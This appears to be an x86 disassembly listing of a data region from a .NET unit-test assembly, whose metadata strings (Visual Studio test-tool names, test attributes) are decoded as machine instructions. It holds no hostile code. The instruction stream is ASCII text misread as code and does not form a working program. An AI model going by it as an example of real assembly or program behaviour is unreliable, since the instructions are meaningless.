  40357c:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403580:	inc    edi
  403581:	gs je  0x4035c9
  403584:	js     0x4035eb
  403586:	arpl   WORD PTR [ebp+0x74],si
  403589:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  403590:	ins    DWORD PTR es:[edi],dx
  403591:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  403595:	inc    ecx
  403596:	jae    0x40360b
  403598:	gs ins DWORD PTR es:[edi],dx
  40359a:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  40359e:	popa   
  40359f:	ins    DWORD PTR es:[edi],dx
  4035a0:	add    BYTE PTR gs:[edi+0x65],al
  4035a4:	je     0x4035f4
  4035a6:	popa   
  4035a7:	ins    DWORD PTR es:[edi],dx
  4035a8:	add    BYTE PTR gs:[edi+0x65],ah
  4035ac:	je     0x40360d
  4035ae:	dec    esi
  4035af:	popa   
  4035b0:	ins    DWORD PTR es:[edi],dx
  4035b1:	add    BYTE PTR gs:[ebx+0x74],dl
  4035b5:	jb     0x403620
  4035b7:	outs   dx,BYTE PTR ds:[esi]
  4035b8:	add    BYTE PTR [bp+di+0x6f],al
  4035bc:	outs   dx,BYTE PTR ds:[esi]
  4035bd:	arpl   WORD PTR [ecx+0x74],sp
  4035c0:	add    BYTE PTR [ebp+0x69],cl
  4035c3:	arpl   WORD PTR [edx+0x6f],si
  4035c6:	jae    0x403637
  4035c8:	data16 je 0x4035f9
  4035cb:	push   esi
  4035cc:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4035d3:	jne    0x403639
  4035d5:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4035dc:	push   esp
  4035dd:	outs   dx,DWORD PTR ds:[esi]
  4035de:	outs   dx,DWORD PTR ds:[esi]
  4035df:	ins    BYTE PTR es:[edi],dx
  4035e0:	jae    0x403610
  4035e2:	inc    ebp
  4035e3:	js     0x40364a
  4035e5:	arpl   WORD PTR [ebp+0x74],si
  4035e8:	imul   ebp,DWORD PTR [edi+0x6e],0x65784500
  4035ef:	arpl   WORD PTR [ebp+0x74],si
  4035f2:	imul   ebp,DWORD PTR [edi+0x6e],0x6c697455
  4035f9:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x65730073
  403601:	je     0x403662
  403603:	inc    ecx
  403604:	jo     0x403676
  403606:	dec    esi
  403607:	popa   
  403608:	ins    DWORD PTR es:[edi],dx
  403609:	add    BYTE PTR gs:[ecx+0x70],al
  40360d:	jo     0x40367b
  40360f:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  403616:	inc    ebp
  403617:	jbe    0x40367e
  403619:	outs   dx,BYTE PTR ds:[esi]
  40361a:	je     0x403668
  40361c:	outs   dx,DWORD PTR ds:[esi]
  40361d:	add    BYTE PTR [bp+di+0x65],dh
  403621:	je     0x403682
  403623:	dec    ecx
  403624:	jae    0x40367d
  403626:	jb     0x403691
  403628:	je     0x403693
  40362a:	outs   dx,BYTE PTR ds:[esi]
  40362b:	add    BYTE PTR [bp+di+0x65],dh
  40362f:	je     0x403690
  403631:	inc    ebp
  403632:	jbe    0x403699
  403634:	outs   dx,BYTE PTR ds:[esi]
  403635:	je     0x40368a
  403637:	outs   dx,DWORD PTR ds:[esi]
  403638:	jne    0x4036ac
  40363a:	arpl   WORD PTR [ebp+0x0],sp
  40363d:	inc    ebx
  40363e:	outs   dx,DWORD PTR ds:[esi]
  40363f:	outs   dx,BYTE PTR ds:[esi]
  403640:	imul   sp,WORD PTR [edi+0x75],0x6172
  403646:	je     0x4036b1
  403648:	outs   dx,DWORD PTR ds:[esi]
  403649:	outs   dx,BYTE PTR ds:[esi]
  40364a:	dec    eax
  40364b:	gs ins BYTE PTR es:[edi],dx
  40364d:	jo     0x4036b4
  40364f:	jb     0x403651
  403651:	push   edx
  403652:	gs popa 
  403654:	fs inc ebx
  403656:	outs   dx,DWORD PTR ds:[esi]
  403657:	outs   dx,BYTE PTR ds:[esi]
  403658:	imul   sp,WORD PTR [edi+0x75],0x6172
  40365e:	je     0x4036c9
  403660:	outs   dx,DWORD PTR ds:[esi]
  403661:	outs   dx,BYTE PTR ds:[esi]
  403662:	inc    esi
  403663:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x61657243
  40366b:	je     0x4036d2
  40366d:	push   esp
  40366e:	jb     0x4036d1
  403670:	arpl   WORD PTR [ebp+0x4c],sp
  403673:	imul   esi,DWORD PTR [ebx+0x74],0x72656e65
  40367a:	add    BYTE PTR [ebp+0x69],cl
  40367d:	arpl   WORD PTR [edx+0x6f],si
  403680:	jae    0x4036f1
  403682:	data16 je 0x4036b3
  403685:	push   esi
  403686:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40368d:	jne    0x4036f3
  40368f:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  403696:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  40369e:	cs inc ebx
  4036a0:	outs   dx,DWORD PTR ds:[esi]
  4036a1:	ins    DWORD PTR es:[edi],dx
  4036a2:	ins    DWORD PTR es:[edi],dx
  4036a3:	outs   dx,DWORD PTR ds:[esi]
  4036a4:	outs   dx,BYTE PTR ds:[esi]
  4036a5:	add    BYTE PTR [ebp+0x69],cl
  4036a8:	arpl   WORD PTR [edx+0x6f],si
  4036ab:	jae    0x40371c
  4036ad:	data16 je 0x4036de
  4036b0:	push   esi
  4036b1:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4036b8:	jne    0x40371e
  4036ba:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4036c1:	push   esp
  4036c2:	outs   dx,DWORD PTR ds:[esi]
  4036c3:	outs   dx,DWORD PTR ds:[esi]
  4036c4:	ins    BYTE PTR es:[edi],dx
  4036c5:	jae    0x4036f5
  4036c7:	inc    esp
  4036c8:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  4036cf:	imul   esp,DWORD PTR [ebx+0x73],0x74714500
  4036d6:	push   esp
  4036d7:	jb     0x40373a
  4036d9:	arpl   WORD PTR [ebp+0x0],sp
  4036dc:	dec    ecx
  4036dd:	outs   dx,BYTE PTR ds:[esi]
  4036de:	outs   dx,WORD PTR ds:[esi]
  4036e0:	add    BYTE PTR [ebx+0x74],dl
  4036e3:	jb     0x40374e
  4036e5:	outs   dx,BYTE PTR ds:[esi]
  4036e6:	addr16 inc ebx
  4036e8:	outs   dx,DWORD PTR ds:[esi]
  4036e9:	ins    DWORD PTR es:[edi],dx
  4036ea:	jo     0x40374d
  4036ec:	jb     0x403757
  4036ee:	jae    0x40375f
  4036f0:	outs   dx,BYTE PTR ds:[esi]
  4036f1:	add    BYTE PTR [ebp+0x71],al
  4036f4:	jne    0x403757
  4036f6:	ins    BYTE PTR es:[edi],dx
  4036f7:	jae    0x4036f9
  4036f9:	dec    ecx
  4036fa:	jae    0x40374a
  4036fc:	jne    0x40376a
  4036fe:	ins    BYTE PTR es:[edi],dx
  4036ff:	dec    edi
  403700:	jb     0x403747
  403702:	ins    DWORD PTR es:[edi],dx
  403703:	jo     0x403779
  403705:	jns    0x403707
  403707:	inc    ebp
  403708:	jb     0x40377c
  40370a:	outs   dx,DWORD PTR ds:[esi]
  40370b:	jb     0x40370d
  40370d:	dec    ebp
  40370e:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403715:	je     0x403745
  403717:	push   esi
  403718:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40371f:	jne    0x403785
  403721:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  403728:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  403730:	cs push edx
  403732:	gs jae 0x4037a4
  403735:	jne    0x4037a9
  403737:	arpl   WORD PTR [ebp+0x0],sp
  40373a:	dec    ebp
  40373b:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403742:	je     0x403772
  403744:	push   esi
  403745:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40374c:	jne    0x4037b2
  40374e:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  403755:	push   esp
  403756:	outs   dx,DWORD PTR ds:[esi]
  403757:	outs   dx,DWORD PTR ds:[esi]
  403758:	ins    BYTE PTR es:[edi],dx
  403759:	jae    0x403789
  40375b:	push   edx
  40375c:	gs jae 0x4037ce
  40375f:	jne    0x4037d3
  403761:	arpl   WORD PTR [ebp+0x73],sp
  403764:	add    BYTE PTR [ebp+0x65],cl
  403767:	jae    0x4037dc
  403769:	popa   
  40376a:	addr16 gs jae 0x40376e
  40376e:	inc    ebp
  40376f:	jno    0x4037e5
  403771:	dec    ebp
  403772:	gs jae 0x4037e8
  403775:	popa   
  403776:	add    BYTE PTR gs:[bx+0x65],ah
  40377b:	je     0x4037dc
  40377d:	inc    ebp
  40377e:	js     0x4037e5
  403780:	arpl   WORD PTR [ebp+0x74],si
  403783:	imul   ebp,DWORD PTR [edi+0x6e],0x6567415f
  40378a:	outs   dx,BYTE PTR ds:[esi]
  40378b:	je     0x4037dd
  40378d:	jb     0x4037fe
  40378f:	arpl   WORD PTR [ebp+0x73],sp
  403792:	jae    0x4037dd
  403794:	outs   dx,BYTE PTR ds:[esi]
  403795:	jbe    0x4037f8
  403797:	ins    BYTE PTR es:[edi],dx
  403798:	imul   esp,DWORD PTR [ebx+edx*2+0x74],0x50747261
  4037a0:	popa   
  4037a1:	jb     0x403804
  4037a3:	ins    DWORD PTR es:[edi],dx
  4037a4:	jae    0x4037a6
  4037a6:	dec    esp
  4037a7:	outs   dx,DWORD PTR ds:[esi]
  4037a8:	arpl   WORD PTR [ecx+0x6c],sp
  4037ab:	imul   edi,DWORD PTR [edx+0x65],0x69725700
  4037b2:	je     0x403819
  4037b4:	inc    ebp
  4037b5:	jbe    0x40381c
  4037b7:	outs   dx,BYTE PTR ds:[esi]
  4037b8:	je     0x403806
  4037ba:	outs   dx,DWORD PTR ds:[esi]
  4037bb:	addr16 inc ebp
  4037bd:	jb     0x403831
  4037bf:	outs   dx,DWORD PTR ds:[esi]
  4037c0:	jb     0x4037c2
  4037c2:	push   ebx
  4037c3:	jns    0x403838
  4037c5:	je     0x40382c
  4037c7:	ins    DWORD PTR es:[edi],dx
  4037c8:	cs inc edi
  4037ca:	ins    BYTE PTR es:[edi],dx
  4037cb:	outs   dx,DWORD PTR ds:[esi]
  4037cc:	bound  esp,QWORD PTR [ecx+0x6c]
  4037cf:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  4037d6:	add    BYTE PTR [esi+0x75],cl
  4037d9:	ins    DWORD PTR es:[edi],dx
  4037da:	bound  esp,QWORD PTR [ebp+0x72]
  4037dd:	inc    esi
  4037de:	outs   dx,DWORD PTR ds:[esi]
  4037df:	jb     0x40384e
  4037e1:	popa   
  4037e2:	je     0x40382d
  4037e4:	outs   dx,BYTE PTR ds:[esi]
  4037e5:	outs   dx,WORD PTR ds:[esi]
  4037e7:	add    BYTE PTR [edi+0x65],ah
  4037ea:	je     0x40384b
  4037ec:	dec    ecx
  4037ed:	outs   dx,BYTE PTR ds:[esi]
  4037ee:	jbe    0x403851
  4037f0:	jb     0x40385b
  4037f2:	popa   
  4037f3:	outs   dx,BYTE PTR ds:[esi]
  4037f4:	je     0x40383f
  4037f6:	outs   dx,BYTE PTR ds:[esi]
  4037f7:	outs   dx,WORD PTR ds:[esi]
  4037f9:	add    BYTE PTR [ecx+0x6e],cl
  4037fc:	je     0x403831
  4037fe:	xor    al,BYTE PTR [eax]
  403800:	dec    esi
  403801:	jne    0x403870
  403803:	bound  esp,QWORD PTR [ebp+0x72]
  403806:	push   ebx
  403807:	je     0x403882
  403809:	ins    BYTE PTR es:[edi],dx
  40380a:	gs jae 0x40380d
  40380d:	dec    ecx
  40380e:	inc    esi
  40380f:	outs   dx,DWORD PTR ds:[esi]
  403810:	jb     0x40387f
  403812:	popa   
  403813:	je     0x403865
  403815:	jb     0x403886
  403817:	jbe    0x403882
  403819:	fs gs jb 0x40381d
  40381d:	push   esp
  40381e:	jb     0x403899
  403820:	push   eax
  403821:	popa   
  403822:	jb     0x403897
  403824:	add    BYTE PTR gs:[ebp+0x6e],dl
  403828:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  40382f:	imul   edi,DWORD PTR [edx+0x65],0x66726550
  403836:	outs   dx,DWORD PTR ds:[esi]
  403837:	jb     0x4038a6
  403839:	popa   
  40383a:	outs   dx,BYTE PTR ds:[esi]
  40383b:	arpl   WORD PTR [ebp+0x44],sp
  40383e:	dec    esp
  40383f:	dec    esp
  403840:	add    BYTE PTR [ebp+0x78],al
  403843:	arpl   WORD PTR [ebp+0x70],sp
  403846:	je     0x4038b1
  403848:	outs   dx,DWORD PTR ds:[esi]
  403849:	outs   dx,BYTE PTR ds:[esi]
  40384a:	add    BYTE PTR [ecx+ebp*2+0x6d],dl
  40384e:	gs jb  0x403894
  403851:	popa   
  403852:	ins    BYTE PTR es:[edi],dx
  403853:	ins    BYTE PTR es:[edi],dx
  403854:	bound  esp,QWORD PTR [ecx+0x63]
  403857:	imul   eax,DWORD PTR [eax],0x47
  40385a:	gs je  0x4038ad
  40385d:	jb     0x4038ce
  40385f:	arpl   WORD PTR [ebp+0x73],sp
  403862:	jae    0x4038a6
  403864:	jns    0x4038af
  403866:	add    BYTE PTR fs:[ebp+0x76],al
  40386a:	outs   dx,BYTE PTR gs:[esi]
  40386c:	je     0x4038b6
  40386e:	popa   
  40386f:	outs   dx,BYTE PTR ds:[esi]
  403870:	fs ins BYTE PTR es:[edi],dx
  403872:	gs jb  0x403875
  403875:	popa   
  403876:	fs fs pop edi
  403879:	inc    ebp
  40387a:	js     0x4038e5
  40387c:	je     0x4038e3
  40387e:	add    BYTE PTR fs:[ebx+0x65],dh
  403882:	je     0x4038e3
  403884:	inc    ebp
  403885:	outs   dx,BYTE PTR ds:[esi]
  403886:	popa   
  403887:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
  40388b:	popa   
  40388c:	imul   esi,DWORD PTR [ebx+0x69],0x7645676e
  403893:	outs   dx,BYTE PTR gs:[esi]
  403895:	je     0x40390a
  403897:	add    BYTE PTR [edi+0x65],ah
  40389a:	je     0x4038fb
  40389c:	dec    ecx
  40389d:	jae    0x4038f3
  40389f:	gs jb  0x40390f
  4038a2:	imul   ebp,DWORD PTR [esi+0x61],0x676e6974
  4038a9:	add    BYTE PTR [ebx+0x6c],al
  4038ac:	gs popa 
  4038ae:	outs   dx,BYTE PTR ds:[esi]
  4038af:	jne    0x403921
  4038b1:	inc    ebp
  4038b2:	js     0x403919
  4038b4:	arpl   WORD PTR [ebp+0x74],si
  4038b7:	imul   ebp,DWORD PTR [edi+0x6e],0x67756c50
  4038be:	imul   ebp,DWORD PTR [esi+0x73],0x67414900
  4038c5:	outs   dx,BYTE PTR gs:[esi]
  4038c7:	je     0x403919
  4038c9:	jb     0x40393a
  4038cb:	arpl   WORD PTR [ebp+0x73],sp
  4038ce:	jae    0x403920
  4038d0:	jb     0x403941
  4038d2:	js     0x40394d
  4038d4:	add    BYTE PTR [ecx+0x41],cl
  4038d7:	outs   dx,BYTE PTR gs:[si]
  4038da:	je     0x40392c
  4038dc:	jb     0x40394d
  4038de:	arpl   WORD PTR [ebp+0x73],sp
  4038e1:	jae    0x403930
  4038e3:	popa   
  4038e4:	outs   dx,BYTE PTR ds:[esi]
  4038e5:	popa   
  4038e6:	addr16 gs jb 0x4038ea
  4038ea:	inc    edi
  4038eb:	gs je  0x40392f
  4038ee:	outs   dx,BYTE PTR gs:[si]
  4038f1:	je     0x403940
  4038f3:	popa   
  4038f4:	outs   dx,BYTE PTR ds:[esi]
  4038f5:	popa   
  4038f6:	addr16 gs jb 0x4038fa
  4038fa:	inc    esp
  4038fb:	popa   
  4038fc:	je     0x40395f
  4038fe:	inc    ebx
  4038ff:	outs   dx,DWORD PTR ds:[esi]
  403900:	ins    BYTE PTR es:[edi],dx
  403901:	ins    BYTE PTR es:[edi],dx
  403902:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  403907:	outs   dx,BYTE PTR ds:[esi]
  403908:	inc    ebp
  403909:	outs   dx,BYTE PTR ds:[esi]
  40390a:	jbe    0x403975
  40390c:	jb     0x40397d
  40390e:	outs   dx,BYTE PTR ds:[esi]
  40390f:	ins    DWORD PTR es:[edi],dx
  403910:	outs   dx,BYTE PTR gs:[esi]
  403912:	je     0x403957
  403914:	outs   dx,DWORD PTR ds:[esi]
  403915:	outs   dx,BYTE PTR ds:[esi]
  403916:	je     0x40397d
  403918:	js     0x40398e
  40391a:	add    BYTE PTR [edi+0x65],ah
  40391d:	je     0x40397e
  40391f:	inc    esp
  403920:	popa   
  403921:	je     0x403984
  403923:	inc    ebx
  403924:	outs   dx,DWORD PTR ds:[esi]
  403925:	ins    BYTE PTR es:[edi],dx
  403926:	ins    BYTE PTR es:[edi],dx
  403927:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40392c:	outs   dx,BYTE PTR ds:[esi]
  40392d:	inc    ebp
  40392e:	outs   dx,BYTE PTR ds:[esi]
  40392f:	jbe    0x40399a
  403931:	jb     0x4039a2
  403933:	outs   dx,BYTE PTR ds:[esi]
  403934:	ins    DWORD PTR es:[edi],dx
  403935:	outs   dx,BYTE PTR gs:[esi]
  403937:	je     0x40397c
  403939:	outs   dx,DWORD PTR ds:[esi]
  40393a:	outs   dx,BYTE PTR ds:[esi]
  40393b:	je     0x4039a2
  40393d:	js     0x4039b3
  40393f:	add    BYTE PTR [ecx+0x67],al
  403942:	outs   dx,BYTE PTR gs:[esi]
  403944:	je     0x403989
  403946:	outs   dx,DWORD PTR ds:[esi]
  403947:	outs   dx,BYTE PTR ds:[esi]
  403948:	je     0x4039af
  40394a:	js     0x4039c0
  40394c:	add    BYTE PTR [edi+0x65],ah
  40394f:	je     0x4039b0
  403951:	inc    ecx
  403952:	outs   dx,BYTE PTR gs:[si]
  403955:	je     0x40399a
  403957:	outs   dx,DWORD PTR ds:[esi]
  403958:	outs   dx,BYTE PTR ds:[esi]
  403959:	je     0x4039c0
  40395b:	js     0x4039d1
  40395d:	add    BYTE PTR [ebx+0x79],dl
  403960:	jae    0x4039d6
  403962:	gs ins DWORD PTR es:[edi],dx
  403964:	cs push edx
  403966:	jne    0x4039d6
  403968:	je     0x4039d3
  40396a:	ins    DWORD PTR es:[edi],dx
  40396b:	gs cs push edx
  40396e:	gs ins DWORD PTR es:[edi],dx
  403970:	outs   dx,DWORD PTR ds:[esi]
  403971:	je     0x4039dc
  403973:	outs   dx,BYTE PTR ds:[esi]
  403974:	addr16 cs inc ebx
  403977:	push   0x656e6e61
  40397c:	ins    BYTE PTR es:[edi],dx
  40397d:	jae    0x40397f
  40397f:	dec    ecx
  403980:	inc    ebx
  403981:	push   0x656e6e61
  403986:	ins    BYTE PTR es:[edi],dx
  403987:	push   edx
  403988:	arpl   WORD PTR gs:[ebp+0x69],sp
  40398c:	jbe    0x4039f3
  40398e:	jb     0x403990
  403990:	inc    ecx
  403991:	fs fs inc ecx
  403994:	outs   dx,BYTE PTR gs:[si]
  403997:	je     0x4039e9
  403999:	jb     0x403a0a
  40399b:	arpl   WORD PTR [ebp+0x73],sp
  40399e:	jae    0x4039e3
  4039a0:	push   0x656e6e61
  4039a5:	ins    BYTE PTR es:[edi],dx
  4039a6:	push   ebp
  4039a7:	jb     0x403a12
  4039a9:	add    BYTE PTR [ebp+0x69],cl
  4039ac:	arpl   WORD PTR [edx+0x6f],si
  4039af:	jae    0x403a20
  4039b1:	data16 je 0x4039e2
  4039b4:	push   esi
  4039b5:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4039bc:	jne    0x403a22
  4039be:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  4039c5:	push   esp
  4039c6:	outs   dx,DWORD PTR ds:[esi]
  4039c7:	outs   dx,DWORD PTR ds:[esi]
  4039c8:	ins    BYTE PTR es:[edi],dx
  4039c9:	jae    0x4039f9
  4039cb:	inc    ebx
  4039cc:	outs   dx,DWORD PTR ds:[esi]
  4039cd:	outs   dx,BYTE PTR ds:[esi]
  4039ce:	je     0x403a42
  4039d0:	outs   dx,DWORD PTR ds:[esi]
  4039d1:	ins    BYTE PTR es:[edi],dx
  4039d2:	ins    BYTE PTR es:[edi],dx
  4039d3:	gs jb  0x4039d6
  4039d6:	dec    ecx
  4039d7:	inc    ebx
  4039d8:	outs   dx,DWORD PTR ds:[esi]
  4039d9:	outs   dx,BYTE PTR ds:[esi]
  4039da:	je     0x403a4e
  4039dc:	outs   dx,DWORD PTR ds:[esi]
  4039dd:	ins    BYTE PTR es:[edi],dx
  4039de:	ins    BYTE PTR es:[edi],dx
  4039df:	gs jb  0x403a25
  4039e2:	popa   
  4039e3:	ins    BYTE PTR es:[edi],dx
  4039e4:	ins    BYTE PTR es:[edi],dx
  4039e5:	bound  esp,QWORD PTR [ecx+0x63]
  4039e8:	imul   eax,DWORD PTR [eax],0x52
  4039eb:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x65547265
  4039f4:	jae    0x403a6a
  4039f6:	inc    ecx
  4039f7:	outs   dx,BYTE PTR gs:[si]
  4039fa:	je     0x4039fc
  4039fc:	addr16 gs je 0x403a5f
  403a00:	inc    ebp
  403a01:	inc    ecx
  403a02:	push   eax
  403a03:	pop    edi
  403a04:	inc    ebx
  403a05:	popa   
  403a06:	outs   dx,BYTE PTR ds:[esi]
  403a07:	dec    esi
  403a08:	outs   dx,DWORD PTR ds:[esi]
  403a09:	je     0x403a5d
  403a0b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  403a14:	je     0x403a7e
  403a16:	push   ebx
  403a17:	gs jb  0x403a90
  403a1a:	imul   esp,DWORD PTR [ebx+0x65],0x6a624f00
  403a21:	arpl   WORD PTR gs:[eax+eax*1+0x54],si
  403a26:	outs   dx,DWORD PTR ds:[esi]
  403a27:	push   ebx
  403a28:	je     0x403a9c
  403a2a:	imul   ebp,DWORD PTR [esi+0x67],0x69615700
  403a31:	je     0x403a7b
  403a33:	popa   
  403a34:	outs   dx,BYTE PTR ds:[esi]
  403a35:	fs ins BYTE PTR es:[edi],dx
  403a37:	add    BYTE PTR gs:[edi+0x61],dl
  403a3b:	imul   esi,DWORD PTR [edi+ecx*2+0x6e],0x65560065
  403a43:	jb     0x403aa7
  403a45:	outs   dx,DWORD PTR ds:[esi]
  403a46:	jae    0x403aad
  403a48:	add    BYTE PTR [ebp+0x6e],al
  403a4b:	jbe    0x403ab6
  403a4d:	jb     0x403abe
  403a4f:	outs   dx,BYTE PTR ds:[esi]
  403a50:	ins    DWORD PTR es:[edi],dx
  403a51:	outs   dx,BYTE PTR gs:[esi]
  403a53:	je     0x403a55
  403a55:	addr16 gs je 0x403ab8
  403a59:	dec    ebp
  403a5a:	popa   
  403a5b:	arpl   WORD PTR [eax+0x69],bp
  403a5e:	outs   dx,BYTE PTR ds:[esi]
  403a5f:	gs dec esi
  403a61:	popa   
  403a62:	ins    DWORD PTR es:[edi],dx
  403a63:	add    BYTE PTR gs:[ebp+0x41],al
  403a67:	push   ebx
  403a68:	pop    edi
  403a69:	inc    ecx
  403a6a:	outs   dx,BYTE PTR gs:[si]
  403a6d:	je     0x403ac2
  403a6f:	gs jb  0x403ae8
  403a72:	imul   esp,DWORD PTR [ebx+0x65],0x706f7453
  403a79:	jo     0x403ae0
  403a7b:	add    BYTE PTR fs:[ebx+0x75],al
  403a7f:	ins    BYTE PTR es:[edi],dx
  403a80:	je     0x403af7
  403a82:	jb     0x403ae9
  403a84:	dec    ecx
  403a85:	outs   dx,BYTE PTR ds:[esi]
  403a86:	outs   dx,WORD PTR ds:[esi]
  403a88:	add    BYTE PTR [edi+0x65],ah
  403a8b:	je     0x403aec
  403a8d:	dec    ecx
  403a8e:	outs   dx,BYTE PTR ds:[esi]
  403a8f:	jbe    0x403af2
  403a91:	jb     0x403afc
  403a93:	popa   
  403a94:	outs   dx,BYTE PTR ds:[esi]
  403a95:	je     0x403ada
  403a97:	jne    0x403b05
  403a99:	je     0x403b10
  403a9b:	jb     0x403b02
  403a9d:	add    BYTE PTR [ebp+0x69],cl
  403aa0:	arpl   WORD PTR [edx+0x6f],si
  403aa3:	jae    0x403b14
  403aa5:	data16 je 0x403ad6
  403aa8:	push   esi
  403aa9:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403ab0:	jne    0x403b16
  403ab2:	imul   ebp,DWORD PTR [edi+0x2e],0x6c617551
  403ab9:	imul   esi,DWORD PTR [ecx+edi*2+0x54],0x736c6f6f
  403ac1:	cs inc ecx
  403ac3:	outs   dx,BYTE PTR gs:[si]
  403ac6:	je     0x403b18
  403ac8:	jb     0x403b39
  403aca:	arpl   WORD PTR [ebp+0x73],sp
  403acd:	jae    0x403b1c
  403acf:	popa   
  403ad0:	outs   dx,BYTE PTR ds:[esi]
  403ad1:	popa   
  403ad2:	addr16 gs jb 0x403ad6
  403ad6:	inc    ecx
  403ad7:	outs   dx,BYTE PTR gs:[si]
  403ada:	je     0x403b2c
  403adc:	jb     0x403b4d
  403ade:	arpl   WORD PTR [ebp+0x73],sp
  403ae1:	jae    0x403b30
  403ae3:	popa   
  403ae4:	outs   dx,BYTE PTR ds:[esi]
  403ae5:	popa   
  403ae6:	addr16 gs jb 0x403b2b
  403aea:	arpl   WORD PTR [ebx+0x65],sp
  403aed:	jae    0x403b62
  403aef:	dec    ebp
  403af0:	popa   
  403af1:	outs   dx,BYTE PTR ds:[esi]
  403af2:	popa   
  403af3:	addr16 gs jb 0x403af7
  403af7:	push   edx
  403af8:	gs ins BYTE PTR es:[edi],dx
  403afa:	popa   
  403afb:	je     0x403b66
  403afd:	jbe    0x403b64
  403aff:	push   edx
  403b00:	gs ins DWORD PTR es:[edi],dx
  403b02:	outs   dx,DWORD PTR ds:[esi]
  403b03:	je     0x403b6e
  403b05:	outs   dx,BYTE PTR ds:[esi]
  403b06:	addr16 push eax
  403b08:	jne    0x403b6c
  403b0a:	ins    BYTE PTR es:[edi],dx
  403b0b:	imul   esi,DWORD PTR [ebx+0x68],0x697255
  403b12:	inc    esi
  403b13:	outs   dx,DWORD PTR ds:[esi]
  403b14:	jb     0x403b83
  403b16:	popa   
  403b17:	je     0x403b19
  403b19:	dec    ecx
  403b1a:	inc    ecx
  403b1b:	outs   dx,BYTE PTR gs:[si]
  403b1e:	je     0x403b70
  403b20:	jb     0x403b91
  403b22:	arpl   WORD PTR [ebp+0x73],sp
  403b25:	jae    0x403b74
  403b27:	popa   
  403b28:	outs   dx,BYTE PTR ds:[esi]
  403b29:	popa   
  403b2a:	addr16 gs jb 0x403b6f
  403b2e:	arpl   WORD PTR [ebx+0x65],sp
  403b31:	jae    0x403ba6
  403b33:	dec    ebp
  403b34:	popa   
  403b35:	outs   dx,BYTE PTR ds:[esi]
  403b36:	popa   
  403b37:	addr16 gs jb 0x403b3b
  403b3b:	push   esp
  403b3c:	jns    0x403bae
  403b3e:	add    BYTE PTR gs:[edx+0x75],dl
  403b42:	outs   dx,BYTE PTR ds:[esi]
  403b43:	je     0x403bae
  403b45:	ins    DWORD PTR es:[edi],dx
  403b46:	gs push esp
  403b48:	jns    0x403bba
  403b4a:	gs dec eax
  403b4c:	popa   
  403b4d:	outs   dx,BYTE PTR ds:[esi]
  403b4e:	fs ins BYTE PTR es:[edi],dx
  403b50:	add    BYTE PTR gs:[edi+0x65],al
  403b54:	je     0x403baa
  403b56:	jns    0x403bc8
  403b58:	gs inc esi
  403b5a:	jb     0x403bcb
  403b5c:	ins    DWORD PTR es:[edi],dx
  403b5d:	dec    eax
  403b5e:	popa   
  403b5f:	outs   dx,BYTE PTR ds:[esi]
  403b60:	fs ins BYTE PTR es:[edi],dx
  403b62:	add    BYTE PTR gs:[ecx+0x63],al
  403b66:	je     0x403bd1
  403b68:	jbe    0x403bcb
  403b6a:	je     0x403bdb
  403b6c:	jb     0x403b6e
  403b6e:	inc    edi
  403b6f:	gs je  0x403bc1
  403b72:	bound  ebp,QWORD PTR [edx+0x65]
  403b75:	arpl   WORD PTR [eax+eax*1+0x4d],si
  403b79:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  403b80:	je     0x403bb0
  403b82:	push   esi
  403b83:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  403b8a:	jne    0x403bf0
  403b8c:	imul   ebp,DWORD PTR [edi+0x2e],0x74736554
  403b93:	push   esp
  403b94:	outs   dx,DWORD PTR ds:[esi]
  403b95:	outs   dx,DWORD PTR ds:[esi]
  403b96:	ins    BYTE PTR es:[edi],dx
  403b97:	jae    0x403bc7
  403b99:	inc    ebx
  403b9a:	outs   dx,DWORD PTR ds:[esi]
  403b9b:	ins    DWORD PTR es:[edi],dx
  403b9c:	ins    DWORD PTR es:[edi],dx
  403b9d:	outs   dx,DWORD PTR ds:[esi]
  403b9e:	outs   dx,BYTE PTR ds:[esi]
  403b9f:	add    BYTE PTR [ebp+0x78],al
  403ba2:	arpl   WORD PTR [ebp+0x70],sp
  403ba5:	je     0x403c10
  403ba7:	outs   dx,DWORD PTR ds:[esi]
  403ba8:	outs   dx,BYTE PTR ds:[esi]
  403ba9:	dec    eax
  403baa:	gs ins BYTE PTR es:[edi],dx
  403bac:	jo     0x403c13
  403bae:	jb     0x403bb0
  403bb0:	inc    edi
  403bb1:	gs je  0x403bf9
  403bb4:	js     0x403c19
  403bb6:	gs jo  0x403c2d
  403bb9:	imul   ebp,DWORD PTR [edi+0x6e],0x7373654d
  403bc0:	popa   
  403bc1:	add    BYTE PTR gs:[di+0x78],al
  403bc6:	arpl   WORD PTR gs:[ebp+0x74],si
